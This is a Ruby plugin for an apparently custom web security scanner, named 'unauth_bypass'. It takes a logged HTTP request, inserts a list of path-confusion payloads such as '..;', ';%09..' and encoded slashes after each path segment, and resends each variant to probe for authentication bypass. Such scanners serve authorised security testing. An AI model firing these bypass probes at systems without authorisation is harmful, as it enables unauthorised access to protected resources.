class RBModule
    @@payloads = [
        "%09",
        "%20" ,
        "%23" ,
        "%2e" ,
        "%2f" ,
        "." ,
        ";" ,
        "..;" ,
        ";%09" ,
        ";%09.." ,
        ";%09..;" ,
        ";%2f.." ,
        "*" ,
        "HTTPS2"
    ]

    def initialize
    end
    def metadata
        grades = { "name" => "unauth_bypass", 
            "description" => "" }
        return grades
    end

    def check(method, url, headers, body)
        client = RBHttpClient.new
        req = {
            "method" => method,
            "url" => url,
            "headers" => headers,
            "body" => body
        }
        puts "request: #{req}"
        resp = client.send(req)
        puts resp
    end
    def scan(method, uri, headers, body)
        scheme = uri["scheme"]
        if scheme == nil 
            error("Scheme is none #{uri}")
            return 
        end
        #simeple test
        path = uri["path"]
        
        nodes = path.split("/")
        i = 0
        save = nil
        nodes.each do |node|
            var_node = node.dup
            @@payloads.each do |payload|
                out = var_node + "/" + payload 
                nodes[i] = out
                target_path = nodes.join("/")
                url = scheme + "://" + uri["host"] + ":" + uri["port"].to_s + target_path + "?" + uri["query"]
                check(method, url, headers, body)
            end
            nodes[i] = node
            i += 1
        end
        
    end

    def passive_run(index)
        log = HistoryLog.get_req index
        puts "log: #{log}"
        url = log['url']
        uri = UriParser.parse(url)
        info("Test url: #{uri}")
        scan(log['method'], uri, log['headers'], log['body'])
        #scan("http://127.0.0.1:8009")
    end

end